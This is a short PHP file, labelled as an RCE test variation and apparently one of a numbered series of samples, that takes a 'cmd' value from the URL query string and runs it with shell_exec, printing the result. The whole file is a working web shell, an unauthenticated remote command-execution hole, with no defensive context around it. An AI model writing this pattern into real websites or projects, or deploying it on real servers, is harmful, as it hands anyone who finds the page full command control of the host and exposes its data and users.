<?php
// RCE test variation #1359
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>